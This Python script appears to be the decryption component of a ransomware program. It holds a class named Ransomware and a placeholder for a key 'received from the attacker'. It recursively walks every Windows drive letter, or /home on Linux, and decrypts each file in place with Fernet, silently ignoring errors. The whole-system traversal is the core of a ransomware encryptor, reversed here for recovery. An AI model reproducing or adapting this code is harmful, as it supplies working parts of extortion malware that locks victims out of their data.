from os import getcwd, path, scandir
from cryptography.fernet import Fernet
import platform
from string import ascii_uppercase

key = b'INSERT FERNET KEY HERE'  # The recovery key received from the attacker is added here
crypter = Fernet(key)


class Ransomware:

    def __init__(self, directory: str = getcwd()):

        self.directory = directory

    def launch(self):
        self.decrypt_system(self.directory)  # Starts decryption function

    def decrypt_system(self, directory: str) -> None:

        for file in scandir(directory):
            complete_name = path.join(directory, file.name)  # Scans directory and gets exact file locations.

            if file.is_dir():
                try:
                    self.decrypt_system(complete_name)
                    # If path is a folder scans folder and decrypts files. If it is not passes.
                except Exception:
                    pass
            elif file.is_file():  # If path is a file decrypts the file.
                try:
                    with open(complete_name, 'rb') as f:
                        tempfile = f.read()
                    _tempfile = crypter.decrypt(tempfile)
                    with open(complete_name, 'wb') as f:
                        f.write(_tempfile)

                except Exception:
                    pass


def main() -> None:
    # Finds out the OS and defines the directory.
    if platform.system() == "Windows":
        for maj in ascii_uppercase:
            directory = f"{maj}:\\"

            try:
                Ransomware(
                    directory=directory or getcwd()
                ).launch()
            except Exception:
                pass

        exit(0)
    elif platform.system() == "Linux":
        directory = "/home"

        Ransomware(
            directory = directory or getcwd(),
        ).launch()
        exit(0)

    else:
        exit(0)


if __name__ == "__main__":
    main()
